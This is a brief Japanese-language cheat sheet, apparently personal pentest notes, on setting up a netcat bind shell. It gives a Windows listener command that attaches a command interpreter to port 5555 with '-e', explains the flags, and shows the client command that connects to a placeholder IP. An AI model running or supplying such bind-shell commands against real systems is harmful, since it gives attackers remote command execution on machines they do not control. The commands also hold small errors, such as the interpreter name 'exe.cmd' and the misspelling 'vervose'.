# ncを使ったバインドシェル他

## 
バインドシェルは攻撃側のportが空いてないと使えないことが難しいところ...

## Windows(バインド側)

```
> nc.exe -lvp 5555 -e exe.cmd
```

-l: 待ち受け
-v: vervose
-p: port

## クライアント側

```
$ nc xxx.xxx.xxx.xxx 5555
```

